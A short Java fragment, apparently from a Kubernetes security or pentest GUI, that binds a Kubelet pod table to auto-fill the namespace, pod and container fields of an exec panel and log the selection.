        kColContainers.setCellValueFactory(c -> c.getValue().containersProperty());
        kubeletPodTable.getSelectionModel().selectedItemProperty().addListener((obs, oldVal, newVal) -> {
            if (newVal != null) {
                execNamespace.setText(newVal.getNamespace()); execPodName.setText(newVal.getName());
                execContainerName.setText(newVal.getFirstContainer());
                ctx.log("[*] Kubelet auto-filled: " + newVal.getNamespace() + "/" + newVal.getName() + " (container: " + newVal.getFirstContainer() + ")");
            }
        });
    }
}
